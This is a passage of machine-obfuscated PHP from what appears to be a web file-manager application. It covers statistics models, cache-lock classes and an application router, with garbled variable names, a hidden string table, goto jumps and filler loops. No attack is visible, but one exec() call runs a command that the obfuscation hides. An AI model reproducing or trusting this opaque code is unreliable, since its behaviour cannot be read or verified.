$ˆ§ÓÃ½ =& $_SERVER[¦»×‡Ãã]; $ã„ñŠÙ =& $this->task; $ã„ñŠÙ[$ˆ§ÓÃ½[1823]] = get_path_this($îĞœçŠ); $ã„ñŠÙ[$ˆ§ÓÃ½[1825]] = $Ÿ²ãó; $ã„ñŠÙ[$ˆ§ÓÃ½[1826]] = $ùé´ë€; $ã„ñŠÙ[$ˆ§ÓÃ½[1143]] = $óûÊúÁ == $ˆ§ÓÃ½[1898] ? $ˆ§ÓÃ½[1893] : $ˆ§ÓÃ½[1894]; $ã„ñŠÙ[$ˆ§ÓÃ½[1827]] = $ˆ§ÓÃ½[12]; $ã„ñŠÙ[$ˆ§ÓÃ½[836]] = $Ÿ²ãó; $ã„ñŠÙ[$ˆ§ÓÃ½[1890]] = $ˆ§ÓÃ½[389]; $this->update(); } public function nameParse($…™÷‘ò·) { $«¬Ê§ª“ =& $_SERVER[¦»×‡Ãã]; $š¡İÜêÆ =& $this->task; if ($š¡İÜêÆ[$«¬Ê§ª“[1773]] < $š¡İÜêÆ[$«¬Ê§ª“[1141]]) { $ŞÎÑœÁ¨ = get_path_this($…™÷‘ò·); if (strstr($ŞÎÑœÁ¨, $«¬Ê§ª“[10])) { $š¡İÜêÆ[$«¬Ê§ª“[1773]] += 1; } } if ($š¡İÜêÆ[$«¬Ê§ª“[1890]] == $«¬Ê§ª“[1279]) { $š¡İÜêÆ[$«¬Ê§ª“[1890]] = $«¬Ê§ª“[389]; } $š¡İÜêÆ[$«¬Ê§ª“[1823]] = $…™÷‘ò·; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($á¡Â˜—) { $¸¿ÇÊß =& $_SERVER[¦»×‡Ãã]; $Ó×•äºË = array($¸¿ÇÊß[662] => array($¸¿ÇÊß[33] => $¸¿ÇÊß[1899], $¸¿ÇÊß[350] => array($¸¿ÇÊß[255], $¸¿ÇÊß[838], $¸¿ÇÊß[1900], $¸¿ÇÊß[1901])), $¸¿ÇÊß[1902] => array($¸¿ÇÊß[33] => $¸¿ÇÊß[1903], $¸¿ÇÊß[350] => array($¸¿ÇÊß[255], $¸¿ÇÊß[836], $¸¿ÇÊß[1904], $¸¿ÇÊß[1905], $¸¿ÇÊß[1906]))); if (!isset($Ó×•äºË[$á¡Â˜—])) { return !1; } $this->optionType = $Ó×•äºË[$á¡Â˜—][$¸¿ÇÊß[33]]; $this->field = $Ó×•äºË[$á¡Â˜—][$¸¿ÇÊß[350]]; return !0; } public function listData($¡É–ç™« = false, $¾Ê†¢ïÀ = "\x6d\x6f\x64\151\146\x79\124\151\x6d\x65", $¸şì¹Åá = false) { return parent::listData($¡É–ç™«, $¾Ê†¢ïÀ, $¸şì¹Åá); } public function trendList($é›ß‚æ) { $Ñë—Ü˜ =& $_SERVER[¦»×‡Ãã]; $”İ¦¢š = $this->listData(); if ($”İ¦¢š) { $Ó¹“ÁÛô = end($”İ¦¢š); $ú”•±µ = date($Ñë—Ü˜[1907], strtotime($Ñë—Ü˜[1908])); if ($Ó¹“ÁÛô[$Ñë—Ü˜[255]] == $ú”•±µ) { return $”İ¦¢š; } $Ë¾äÀıŠ = strtotime($Ó¹“ÁÛô[$Ñë—Ü˜[255]]); } if (!isset($Ë¾äÀıŠ)) { $†šĞ¥¾ = $é›ß‚æ == $Ñë—Ü˜[662] ? $Ñë—Ü˜[598] : $Ñë—Ü˜[897]; $Ë¾äÀıŠ = Model($†šĞ¥¾)->min($Ñë—Ü˜[231]); } $íÑ£ª¦ = $Ñë—Ü˜[1909] . ucfirst($é›ß‚æ); $´ñÜñÒã = $this->dateList($Ë¾äÀıŠ); foreach ($´ñÜñÒã as $ú”•±µ) { $this->{$íÑ£ª¦}($ú”•±µ); } return $this->listData(); } private function dateList($¹‹ûÁÁÖ) { $šÉèƒ­· =& $_SERVER[¦»×‡Ãã]; $ªË¶ß²‰ = $¹‹ûÁÁÖ; $Ë®ù›© = strtotime($šÉèƒ­·[1908]); $†°Ú±¹ô = array(); while ($ªË¶ß²‰ <= $Ë®ù›©) { $†°Ú±¹ô[] = date($šÉèƒ­·[1907], $ªË¶ß²‰); $ªË¶ß²‰ = strtotime($šÉèƒ­·[1910], $ªË¶ß²‰); } return $†°Ú±¹ô; } public function _recordUser($É ‘·—Ú = '') { $®µıóëê =& $_SERVER[¦»×‡Ãã]; $âñÜ«û = strtotime(date($®µıóëê[1911], strtotime($É ‘·—Ú))); $Àˆ©“¦ = strtotime(date($®µıóëê[1912], strtotime($É ‘·—Ú))); $ƒğ’¯€ü = array($®µıóëê[231] => array($®µıóëê[1091], $Àˆ©“¦)); $î×Ü’ä¶ = Model($®µıóëê[598])->where($ƒğ’¯€ü)->count($®µıóëê[1772]); $ƒğ’¯€ü[$®µıóëê[231]] = array($®µıóëê[409], array($âñÜ«û, $Àˆ©“¦)); $ÇÎ„Ÿœ¶ = Model($®µıóëê[598])->where($ƒğ’¯€ü)->count($®µıóëê[1772]); $ƒğ’¯€ü[$®µıóëê[33]] = $®µıóëê[1913]; $À¾Œß¤ = Model($®µıóëê[1914])->where($ƒğ’¯€ü)->count($®µıóëê[1915]); $õ›ÖÀ“€ = array($®µıóëê[255] => $É ‘·—Ú, $®µıóëê[838] => (int) $î×Ü’ä¶, $®µıóëê[1900] => (int) $ÇÎ„Ÿœ¶, $®µıóëê[1901] => (int) $À¾Œß¤); return $this->insert($õ›ÖÀ“€); } public function _recordStore($ØğÕƒ†ƒ = '') { $¡ù¦ÊîÙ =& $_SERVER[¦»×‡Ãã]; $Şó÷¨‚ = strtotime(date($¡ù¦ÊîÙ[1912], strtotime($ØğÕƒ†ƒ))); $ïª­‚©ó = array($¡ù¦ÊîÙ[231] => array($¡ù¦ÊîÙ[1091], $Şó÷¨‚)); $–¢ˆ©Á¡ = Model($¡ù¦ÊîÙ[544])->where($ïª­‚©ó)->sum($¡ù¦ÊîÙ[79]); $ïª­‚©ó[$¡ù¦ÊîÙ[485]] = 0; $£ßœ±È· = Model($¡ù¦ÊîÙ[897])->where($ïª­‚©ó)->sum($¡ù¦ÊîÙ[79]); $ïª­‚©ó[$¡ù¦ÊîÙ[190]] = 1; $¤ùÑÙÕé = Model($¡ù¦ÊîÙ[897])->where($ïª­‚©ó)->sum($¡ù¦ÊîÙ[79]); $ïª­‚©ó[$¡ù¦ÊîÙ[190]] = 2; $Œ¹õâàó = Model($¡ù¦ÊîÙ[897])->where($ïª­‚©ó)->sum($¡ù¦ÊîÙ[79]); $Ô³û­º¶ = array($¡ù¦ÊîÙ[255] => $ØğÕƒ†ƒ, $¡ù¦ÊîÙ[836] => (int) $£ßœ±È·, $¡ù¦ÊîÙ[1904] => (int) $–¢ˆ©Á¡, $¡ù¦ÊîÙ[1905] => (int) $¤ùÑÙÕé, $¡ù¦ÊîÙ[1906] => (int) $Œ¹õâàó); return $this->insert($Ô³û­º¶); } public function trend($Î›‰á, $ÏåÇ¡Í) { $äÁÛÄ•€ =& $_SERVER[¦»×‡Ãã]; if (!$this->init($Î›‰á)) { return !1; } $¢ıì‘ì = $this->trendList($Î›‰á); if ($¢ıì‘ì && $ÏåÇ¡Í != $äÁÛÄ•€[1745]) { $„±¯¬¸” = $¢ıì‘ì[0][$äÁÛÄ•€[255]]; $¤­ûô´Æ = $this->validDate($ÏåÇ¡Í, $„±¯¬¸”); $á¤á¿•… = array(); $’ğìµäá = array_to_keyvalue($¢ıì‘ì, $äÁÛÄ•€[255]); foreach ($¤­ûô´Æ as $ŸåÈ÷ä‡) { if (isset($’ğìµäá[$ŸåÈ÷ä‡])) { $’öİ‡˜ = $’ğìµäá[$ŸåÈ÷ä‡]; } else { $’öİ‡˜ = end($¢ıì‘ì); $’öİ‡˜[$äÁÛÄ•€[255]] = $ŸåÈ÷ä‡; if ($Î›‰á == $äÁÛÄ•€[662]) { $’öİ‡˜[$äÁÛÄ•€[1900]] = $’öİ‡˜[$äÁÛÄ•€[1901]] = 0; } } $á¤á¿•…[] = $’öİ‡˜; } $¢ıì‘ì = $á¤á¿•…; } $Ôğ „×» = array($äÁÛÄ•€[662] => array($äÁÛÄ•€[838] => LNG($äÁÛÄ•€[1916]), $äÁÛÄ•€[1900] => LNG($äÁÛÄ•€[1917]), $äÁÛÄ•€[1901] => LNG($äÁÛÄ•€[1918])), $äÁÛÄ•€[1902] => array($äÁÛÄ•€[836] => LNG($äÁÛÄ•€[1919]), $äÁÛÄ•€[1904] => LNG($äÁÛÄ•€[1920]), $äÁÛÄ•€[1905] => LNG($äÁÛÄ•€[1921]), $äÁÛÄ•€[1906] => LNG($äÁÛÄ•€[1922]))); $ûµ“Û  = array($äÁÛÄ•€[662] => $äÁÛÄ•€[1923], $äÁÛÄ•€[1902] => $äÁÛÄ•€[79]); if (empty($¢ıì‘ì)) { $ŸåÈ÷ä‡ = date($äÁÛÄ•€[1907], strtotime($äÁÛÄ•€[1908])); $ì¹ô¬¶ = array($äÁÛÄ•€[255] => $ŸåÈ÷ä‡); foreach ($Ôğ „×»[$Î›‰á] as $¹â™áóª => $ûĞìÒİ‰) { $ì¹ô¬¶[$¹â™áóª] = 0; } $¢ıì‘ì[] = $ì¹ô¬¶; } $©ƒğÎş = array(); foreach ($¢ıì‘ì as $ûĞìÒİ‰) { if ($Î›‰á == $äÁÛÄ•€[1902] && $ûĞìÒİ‰[$äÁÛÄ•€[1904]] > $ûĞìÒİ‰[$äÁÛÄ•€[836]]) { $ûĞìÒİ‰[$äÁÛÄ•€[1904]] = $ûĞìÒİ‰[$äÁÛÄ•€[836]]; } foreach ($Ôğ „×»[$Î›‰á] as $¹â™áóª => $¨³à¹³Õ) { $’öİ‡˜ = array($äÁÛÄ•€[255] => $ûĞìÒİ‰[$äÁÛÄ•€[255]], $äÁÛÄ•€[1661] => $¨³à¹³Õ); $’öİ‡˜[$ûµ“Û [$Î›‰á]] = isset($ûĞìÒİ‰[$¹â™áóª]) ? $ûĞìÒİ‰[$¹â™áóª] : 0; $©ƒğÎş[] = $’öİ‡˜; } } return $©ƒğÎş; } public function validDate($Ş«ğéé, $ÛÕ¡í…Í) { $õ„êâÊê =& $_SERVER[¦»×‡Ãã]; $ø„û = date($õ„êâÊê[1907], strtotime($õ„êâÊê[1908])); $Âœ´•ß = array($ø„û); switch ($Ş«ğéé) { case $õ„êâÊê[1752]: $°Îµù¥¥ = mktime(0, 0, 0, date($õ„êâÊê[1924]), date($õ„êâÊê[1451]) - date($õ„êâÊê[1541]) + 7 - 7, date($õ„êâÊê[1925])); $¾×î˜ı = 0; do { $¡Ì¶ã‘ = date($õ„êâÊê[1907], $°Îµù¥¥ - 3600 * 24 * 7 * $¾×î˜ı); $Âœ´•ß[] = $¡Ì¶ã‘; $¾×î˜ı++; } while ($ÛÕ¡í…Í < $¡Ì¶ã‘); break; case $õ„êâÊê[1750]: $¾×î˜ı = 1; do { $§ÃÕğ€ = date($õ„êâÊê[1926], strtotime("\55\40{$¾×î˜ı}\x20\155\157\156\164\150\163")); $Âœ´•ß[] = $§ÃÕğ€; $¾×î˜ı++; } while ($ÛÕ¡í…Í < $§ÃÕğ€); break; case $õ„êâÊê[1927]: $‰Æ„«Ò™ = (int) date($õ„êâÊê[1925], strtotime($ÛÕ¡í…Í)); $·ÍÆ–ÔĞ = (int) date($õ„êâÊê[1925]); if ($‰Æ„«Ò™ >= $·ÍÆ–ÔĞ) { break; } for ($‰Æ„«Ò™; $‰Æ„«Ò™ < $·ÍÆ–ÔĞ; $‰Æ„«Ò™++) { $Âœ´•ß[] = $‰Æ„«Ò™ . $õ„êâÊê[1928]; } break; default: break; } if ($ÛÕ¡í…Í > end($Âœ´•ß)) { array_pop($Âœ´•ß); } sort($Âœ´•ß); return $Âœ´•ß; } public function listTable($”“¡Ç²) { $ù‹•Í ä = ucfirst($”“¡Ç²); return Model($ù‹•Í ä)->listData(); } public function option($İÒˆ×Øë) { $ã€©ô‘„ = $_SERVER[¦»×‡Ãã][1929] . ucfirst($İÒˆ×Øë); return $this->{$ã€©ô‘„}(); } private function optionUser() { $æÁİğ×³ =& $_SERVER[¦»×‡Ãã]; $‚ì•÷¹À = Model($æÁİğ×³[598])->count($æÁİğ×³[1772]); $ÅÌ…¦ä = Model($æÁİğ×³[598])->where($æÁİğ×³[1930])->count($æÁİğ×³[1772]); $†—†ÛÅÍ = intval($GLOBALS[$æÁİğ×³[6]][$æÁİğ×³[425]][$æÁİğ×³[1718]]) / 3600; $ÉßšÉÂ = strtotime("\x2d{$†—†ÛÅÍ}\40\x68\x6f\165\162\x73"); $‡ëõ‡“Š = strtotime(date($æÁİğ×³[1911])); if ($ÉßšÉÂ < $‡ëõ‡“Š) { $ÉßšÉÂ = $‡ëõ‡“Š; } $”Ëëñ¸ = array($æÁİğ×³[1931] => array($æÁİğ×³[1092], $ÉßšÉÂ)); $¥¨áÚüÆ = (int) Model($æÁİğ×³[598])->where($”Ëëñ¸)->count($æÁİğ×³[1772]); if (!$¥¨áÚüÆ) { $¥¨áÚüÆ = 1; } $”Ëëñ¸ = array($æÁİğ×³[1931] => array($æÁİğ×³[1092], $‡ëõ‡“Š)); $”ùÖ¢Ïë = Model($æÁİğ×³[598])->where($”Ëëñ¸)->count($æÁİğ×³[1772]); return array($æÁİğ×³[831] => (int) $‚ì•÷¹À, $æÁİğ×³[1932] => (int) ($‚ì•÷¹À - $ÅÌ…¦ä), $æÁİğ×³[1933] => (int) $ÅÌ…¦ä, $æÁİğ×³[1934] => (int) $”ùÖ¢Ïë, $æÁİğ×³[1935] => $¥¨áÚüÆ); } private function optionFile() { $âë†½È =& $_SERVER[¦»×‡Ãã]; $ÔÃÍú­ = $this->sourceSize(); $æ¬Õ†°Ê = $ÔÃÍú­[$âë†½È[79]]; $ÖÜ˜½æ = $ÔÃÍú­[$âë†½È[1904]]; $á²ãòÇé = Model($âë†½È[897])->where(array($âë†½È[485] => 0))->count($âë†½È[193]); $Ä„ŒĞ€ç = array($âë†½È[485] => 0, $âë†½È[231] => array($âë†½È[1092], strtotime(date($âë†½È[1911])))); $÷£»ŠŞ• = Model($âë†½È[897])->where($Ä„ŒĞ€ç)->sum($âë†½È[79]); $ëééèÙÌ = Model($âë†½È[897])->where($Ä„ŒĞ€ç)->count($âë†½È[193]); return array($âë†½È[836] => $æ¬Õ†°Ê, $âë†½È[1904] => $ÖÜ˜½æ, $âë†½È[1936] => $æ¬Õ†°Ê - $ÖÜ˜½æ, $âë†½È[1937] => (int) $÷£»ŠŞ•, $âë†½È[838] => (int) $á²ãòÇé, $âë†½È[1938] => (int) $ëééèÙÌ); } private function optionAccess() { $º¯‰ ”î =& $_SERVER[¦»×‡Ãã]; return array($º¯‰ ”î[831] => $this->typeLogCnt(), $º¯‰ ”î[110] => $this->typeLogCnt($º¯‰ ”î[110]), $º¯‰ ”î[525] => $this->typeLogCnt($º¯‰ ”î[525]), $º¯‰ ”î[1939] => $this->typeLogCnt($º¯‰ ”î[1939]), $º¯‰ ”î[1940] => $this->typeLogCnt($º¯‰ ”î[1940]), $º¯‰ ”î[662] => $this->typeLogCnt($º¯‰ ”î[12], $º¯‰ ”î[1915])); } private function typeLogCnt($ô•µ·ˆ£ = '', $œêÁ£®Í = "\151\x64") { $ğ†¦îø =& $_SERVER[¦»×‡Ãã]; $ºÓ‘¯Ë– = array($ğ†¦îø[110] => array($ğ†¦îø[1941], $ğ†¦îø[1942]), $ğ†¦îø[525] => array($ğ†¦îø[1943], $ğ†¦îø[1944]), $ğ†¦îø[1939] => array($ğ†¦îø[1945], $ğ†¦îø[1946], $ğ†¦îø[1947]), $ğ†¦îø[1940] => array($ğ†¦îø[1948], $ğ†¦îø[1949]), $ğ†¦îø[1950] => array($ğ†¦îø[1951], $ğ†¦îø[1952], $ğ†¦îø[1953])); $è¦ëúáÙ = strtotime(date($ğ†¦îø[1911])); $˜å·¸ù† = array($ğ†¦îø[231] => array($ğ†¦îø[1092], $è¦ëúáÙ)); if ($ô•µ·ˆ£) { $˜å·¸ù†[$ğ†¦îø[33]] = array($ğ†¦îø[7], $ºÓ‘¯Ë–[$ô•µ·ˆ£]); } $Öƒ´ñòÁ = Model($ğ†¦îø[1914])->where($˜å·¸ù†)->count($œêÁ£®Í); return (int) $Öƒ´ñòÁ; } private function optionServer() { $…ÎÜê«¬ =& $_SERVER[¦»×‡Ãã]; $°íõğ“ğ = $this->diskDriver(); $àÆÀ‘ùŸ = KodIO::defaultDriver(); $äöÌ”ğ = array($…ÎÜê«¬[890] => $àÆÀ‘ùŸ[$…ÎÜê«¬[475]]); $¯¹è‚ï = Model($…ÎÜê«¬[544])->where($äöÌ”ğ)->sum($…ÎÜê«¬[79]); $ÔÚª•¸û = explode($…ÎÜê«¬[53], $_SERVER[$…ÎÜê«¬[147]]); $ñµ®®ƒ¨ = $ÔÚª•¸û[0]; $ÏèşâÎ÷ = $GLOBALS[$…ÎÜê«¬[6]][$…ÎÜê«¬[21]]; $ıØÄ’¬Ô = $ÏèşâÎ÷[$…ÎÜê«¬[1054]]; if ($ıØÄ’¬Ô == $…ÎÜê«¬[1042]) { $«ÈË‹ãÀ = explode($…ÎÜê«¬[1368], $ÏèşâÎ÷[$…ÎÜê«¬[1053]]); $ıØÄ’¬Ô = $«ÈË‹ãÀ[0]; } if ($ıØÄ’¬Ô == $…ÎÜê«¬[990] || $ıØÄ’¬Ô == $…ÎÜê«¬[877]) { $ªÓÑ¿ıû = Model()->db()->query($…ÎÜê«¬[1954]); $–êÒèŸØ = $ªÓÑ¿ıû[0] && isset($ªÓÑ¿ıû[0][$…ÎÜê«¬[1660]]) ? $ªÓÑ¿ıû[0][$…ÎÜê«¬[1660]] : 0; $ıØÄ’¬Ô = $…ÎÜê«¬[1955] . ($–êÒèŸØ ? $…ÎÜê«¬[8] . $–êÒèŸØ : $…ÎÜê«¬[12]); } $‡¼¿½şï = $GLOBALS[$…ÎÜê«¬[6]][$…ÎÜê«¬[425]][$…ÎÜê«¬[899]]; return array($…ÎÜê«¬[1956] => $°íõğ“ğ ? $°íõğ“ğ[$…ÎÜê«¬[1957]] : 0, $…ÎÜê«¬[1958] => $°íõğ“ğ ? $°íõğ“ğ[$…ÎÜê«¬[1959]] : 0, $…ÎÜê«¬[1960] => (int) $àÆÀ‘ùŸ[$…ÎÜê«¬[1957]] * 1024 * 1024 * 1024, $…ÎÜê«¬[1961] => (int) $¯¹è‚ï, $…ÎÜê«¬[1962] => ucfirst($ñµ®®ƒ¨), $…ÎÜê«¬[1963] => $…ÎÜê«¬[1964] . PHP_VERSION, $…ÎÜê«¬[1965] => phpBuild64() ? 64 : 32, $…ÎÜê«¬[830] => str_replace($…ÎÜê«¬[1211], $…ÎÜê«¬[1070], $ıØÄ’¬Ô), $…ÎÜê«¬[425] => ucfirst($‡¼¿½şï), $…ÎÜê«¬[32] => $_SERVER[$…ÎÜê«¬[1966]]); } private function diskDriver() { $Ì°®ìïª =& $_SERVER[¦»×‡Ãã]; $†Š†µšÃ = $Ì°®ìïª[8]; $òÓÁªâí = $GLOBALS[$Ì°®ìïª[6]][$Ì°®ìïª[1385]] == $Ì°®ìïª[1386]; if ($òÓÁªâí) { $†Š†µšÃ = $Ì°®ìïª[1967]; if (function_exists($Ì°®ìïª[1968])) { exec($Ì°®ìïª[1969], $§¯¦÷ëï); $†Š†µšÃ = $§¯¦÷ëï[1] . $Ì°®ìïª[8]; } } if (!file_exists($†Š†µšÃ)) { return; } if (!function_exists($Ì°®ìïª[1970])) { return; } $Ş«¨ì²ä = @disk_total_space($†Š†µšÃ); $ãÓÒÊÍ = $Ş«¨ì²ä - @disk_free_space($†Š†µšÃ); return array($Ì°®ìïª[1957] => $Ş«¨ì²ä, $Ì°®ìïª[1959] => $ãÓÒÊÍ); } public function fileChart($ñ¦ù” ¡) { $‡§ü­è =& $_SERVER[¦»×‡Ãã]; if (isset($ñ¦ù” ¡[$‡§ü­è[1772]])) { return Model($‡§ü­è[897])->userFileTypeProfile($ñ¦ù” ¡[$‡§ü­è[1772]]); } if (isset($ñ¦ù” ¡[$‡§ü­è[1971]])) { return Model($‡§ü­è[897])->groupFileTypeProfile($ñ¦ù” ¡[$‡§ü­è[1971]]); } $ï•â¡µ = $this->sourceSize(); $Œ›¢ÒÜ† = array($‡§ü­è[192] => 0, $‡§ü­è[190] => 1); $Ï›û“© = Model($‡§ü­è[897])->where($Œ›¢ÒÜ†)->sum($‡§ü­è[79]); $Œ›¢ÒÜ†[$‡§ü­è[190]] = 2; $¹Ú²Îüø = Model($‡§ü­è[897])->where($Œ›¢ÒÜ†)->sum($‡§ü­è[79]); return array($‡§ü­è[836] => $ï•â¡µ[$‡§ü­è[79]], $‡§ü­è[1904] => $ï•â¡µ[$‡§ü­è[1904]], $‡§ü­è[1905] => (int) $Ï›û“©, $‡§ü­è[1906] => (int) $¹Ú²Îüø); } private function sourceSize() { $æ½³Ù—Â =& $_SERVER[¦»×‡Ãã]; $‰ÃÔü¦’ = Model($æ½³Ù—Â[897])->where(array($æ½³Ù—Â[485] => 0))->sum($æ½³Ù—Â[79]); $¹¶ªÑÚÌ = Model($æ½³Ù—Â[544])->sum($æ½³Ù—Â[79]); if ($¹¶ªÑÚÌ > $‰ÃÔü¦’) { $¹¶ªÑÚÌ = $‰ÃÔü¦’; } return array($æ½³Ù—Â[79] => (int) $‰ÃÔü¦’, $æ½³Ù—Â[1904] => (int) $¹¶ªÑÚÌ); } } goto eçÜ¹íŸµ¤; Dì®­õ““İ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $­¬¯ø”§ =& $_SERVER[¦»×‡Ãã]; $Ñ²şÍïœ = $GLOBALS[$­¬¯ø”§[6]][$­¬¯ø”§[425]]; self::$cachePath = $Ñ²şÍïœ[$­¬¯ø”§[230]][$­¬¯ø”§[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($‚š¦ÍÎ, $üÃ¿°ñ = 0) { $¸ƒæÏÒ  =& $_SERVER[¦»×‡Ãã]; $ö—Ó = microtime(!0); $êÌğú” = $ö—Ó + $üÃ¿°ñ + 0.0001; $¡ã¡Áí = rtrim(self::$cachePath, $¸ƒæÏÒ [8]) . $¸ƒæÏÒ [936] . md5($‚š¦ÍÎ) . $¸ƒæÏÒ [933]; if (file_exists($¡ã¡Áí) && filemtime($¡ã¡Áí) && filemtime($¡ã¡Áí) < time() - 10) { @unlink($¡ã¡Áí); } do { if (file_exists($¡ã¡Áí)) { cacheLockWait(); continue; } $¹ÈÃ“Â· = fopen($¡ã¡Áí, $¸ƒæÏÒ [937]); if (!$¹ÈÃ“Â·) { return !1; } $‡¡ĞÁÈ = flock($¹ÈÃ“Â·, LOCK_EX | LOCK_NB); self::$caches[$‚š¦ÍÎ] = array($¸ƒæÏÒ [938] => $¹ÈÃ“Â·, $¸ƒæÏÒ [230] => $¡ã¡Áí); fwrite($¹ÈÃ“Â·, $êÌğú”); clearstatcache(); if ($¹ÈÃ“Â· && $‡¡ĞÁÈ) { return !0; } cacheLockWait(); } while (microtime(!0) < $êÌğú”); $this->unlock($‚š¦ÍÎ); return !1; } public function lockGet($²ğÓ­®) { $»ÅÌÛ” =& $_SERVER[¦»×‡Ãã]; $Âí´çÀ† = rtrim(self::$cachePath, $»ÅÌÛ”[8]) . $»ÅÌÛ”[936] . md5($²ğÓ­®) . $»ÅÌÛ”[933]; return file_exists($Âí´çÀ†); } public function unlock($¿Œ·Ğ‚Ã) { $Öö¡§Ü× =& $_SERVER[¦»×‡Ãã]; $¹‡›±ç = self::$caches[$¿Œ·Ğ‚Ã]; if (!$¹‡›±ç) { return; } @flock($¹‡›±ç[$Öö¡§Ü×[938]], LOCK_UN); @fclose($¹‡›±ç[$Öö¡§Ü×[938]]); @unlink($¹‡›±ç[$Öö¡§Ü×[230]]); unset(self::$caches[$¿Œ·Ğ‚Ã]); } } class CacheLockRedis { public function lock($ş•üáÊ·, $ëÚàÒ = 10) { $¦¼ş²Ø¸ = Cache::init(); $õ™™‰‰è = microtime(!0) + $ëÚàÒ; while (microtime(!0) < $õ™™‰‰è) { $×²£Ë¹ = $¦¼ş²Ø¸->get($ş•üáÊ·); if (!$×²£Ë¹) { $™á±­²“ = $¦¼ş²Ø¸->setLock($ş•üáÊ·, $õ™™‰‰è, $ëÚàÒ); if ($™á±­²“) { return !0; } } else { if ($×²£Ë¹ < microtime(!0)) { $¦¼ş²Ø¸->set($ş•üáÊ·, $õ™™‰‰è, $ëÚàÒ * 2); if ($¦¼ş²Ø¸->get($ş•üáÊ·) === $×²£Ë¹) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ìŠ¨†) { return Cache::init()->get($ìŠ¨†); } public function unlock($Ä¯©® ) { return Cache::init()->remove($Ä¯©® ); } } goto BÌï‚ùÓºÈ; bëŸ¤¬ˆè: while (strlen($msdgxqoavn) < $_SERVER[¦»×‡Ãã][684]) { if (!$msdgxqoavn) { break; } $msdgxqoavn++; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\151\156\x64\145\x78"; private $defaultAction = "\151\x6e\x64\145\x78"; function __construct() { } public function setDefault($Ø‡ÕˆÀï) { $«Ùõ¤ñ— =& $_SERVER[¦»×‡Ãã]; $ª¦×€ç• =& $_SERVER[šÜÉ²œ]; $íùÃĞƒº = explode($ª¦×€ç•[0], trim($Ø‡ÕˆÀï, $ª¦×€ç•[0])); $—’íŞ› = $«Ùõ¤ñ—[685]; while (strlen($—’íŞ›) < $«Ùõ¤ñ—[680]) { if (!$—’íŞ›) { break; } $—’íŞ›++; } $this->defaultModule = $íùÃĞƒº[0] ? $íùÃĞƒº[0] : $this->defaultModule; $¼½Ôê¸ = $«Ùõ¤ñ—[686]; if (!$¼½Ôê¸) { die; } $this->defaultController = $íùÃĞƒº[1] ? $íùÃĞƒº[1] : $this->defaultController; $‚““ñ™Î = $«Ùõ¤ñ—[687]; if (!$‚““ñ™Î) { die; } $this->defaultAction = $íùÃĞƒº[2] ? $íùÃĞƒº[2] : $this->defaultAction; $this->tugb3fc47667($ª¦×€ç•[1], array($this, $ª¦×€ç•[2])); $ËÄ®’õˆ = $«Ùõ¤ñ—[688]; if (!$ËÄ®’õˆ) { return; } } public function appRun($Ä‰Ì’¬) { $Ò¾¾·ì¢ =& $_SERVER[¦»×‡Ãã]; $²¼æ¼Ãø =& $_SERVER[šÜÉ²œ]; $ÚÎ»ıü = explode($²¼æ¼Ãø[0], $Ä‰Ì’¬); $°¯‘Ô”ø = strtolower($ÚÎ»ıü[0]); $™î¶’‡– = $²¼æ¼Ãø[3]; $¡Ì¸‡œ¾ = $Ò¾¾·ì¢[689]; if (strlen($¡Ì¸‡œ¾) < $Ò¾¾·ì¢[690]) { return; } if ($°¯‘Ô”ø == $²¼æ¼Ãø[4]) { $™î¶’‡– = $²¼æ¼Ãø[5]; $ÚÎ»ıü[0] = $²¼æ¼Ãø[6]; $ÚÎ»ıü[1] = $ÚÎ»ıü[1] . $²¼æ¼Ãø[7]; $Ä‰Ì’¬ = join($²¼æ¼Ãø[0], $ÚÎ»ıü); $Ä‰Ì’¬ = trim($Ä‰Ì’¬, $²¼æ¼Ãø[0]); } call_user_func(array($²¼æ¼Ãø[8], $²¼æ¼Ãø[9]), $™î¶’‡– . $²¼æ¼Ãø[10], $Ä‰Ì’¬); ActionCall($Ä‰Ì’¬); call_user_func(array($²¼æ¼Ãø[8], $²¼æ¼Ãø[9]), $™î¶’‡– . $²¼æ¼Ãø[11], $Ä‰Ì’¬); } private function autorun() { $îß˜¨‘Ò =& $_SERVER[¦»×‡Ãã]; $ŠäÅ÷Ûû =& $_SERVER[šÜÉ²œ]; global $config; $Õ·»úøó = $îß˜¨‘Ò[691]; if (strlen($Õ·»úøó) < $îß˜¨‘Ò[690]) { return; } if (count($config[$ŠäÅ÷Ûû[12]]) == 0) { return; } foreach ($config[$ŠäÅ÷Ûû[12]] as $·–”ûÎ² => $¥èæå¨) { $this->appRun($¥èæå¨); $ìâçÎÆ™ = $îß˜¨‘Ò[692]; while (strlen($ìâçÎÆ™) < $îß˜¨‘Ò[690]) { if (!$ìâçÎÆ™) { break; } $ìâçÎÆ™++; } } } private function xtoza770eab2() { $¶¹à¶ª¬ =& $_SERVER[¦»×‡Ãã]; $µ±¹Ú» =& $_SERVER[šÜÉ²œ]; $ÑÇ÷ÇÈ = $µ±¹Ú»[4]; $²¾óŠÓğ = $GLOBALS[$µ±¹Ú»[13]][$µ±¹Ú»[14]][0]; $ Öı˜õ = $¶¹à¶ª¬[693]; while (strlen($ Öı˜õ) < $¶¹à¶ª¬[694]) { if (!$ Öı˜õ) { break; } $ Öı˜õ++; } if (!$²¾óŠÓğ || strlen($²¾óŠÓğ) <= strlen($ÑÇ÷ÇÈ)) { return; } if (strtolower(substr($²¾óŠÓğ, -strlen($ÑÇ÷ÇÈ))) != $ÑÇ÷ÇÈ) { return; } $šğ¢¿²¤ = substr($²¾óŠÓğ, 0, -strlen($ÑÇ÷ÇÈ)); $ÌŸ³¡© = array($µ±¹Ú»[4], $šğ¢¿²¤); $Ô‰Ÿ‰ªÀ = array_slice($GLOBALS[$µ±¹Ú»[13]][$µ±¹Ú»[14]], 1); $GLOBALS[$µ±¹Ú»[13]][$µ±¹Ú»[14]] = array_merge($ÌŸ³¡©, $Ô‰Ÿ‰ªÀ); $·±™ôØ‰ = $¶¹à¶ª¬[695]; while ($·±™ôØ‰ < $¶¹à¶ª¬[684]) { if ($·±™ôØ‰ >= 0) { break; } $·±™ôØ‰++; } $GLOBALS[$µ±¹Ú»[13]][$µ±¹Ú»[15]] = implode($µ±¹Ú»[0], $GLOBALS[$µ±¹Ú»[13]][$µ±¹Ú»[14]]); } private function nlay9c9ac8e5() { 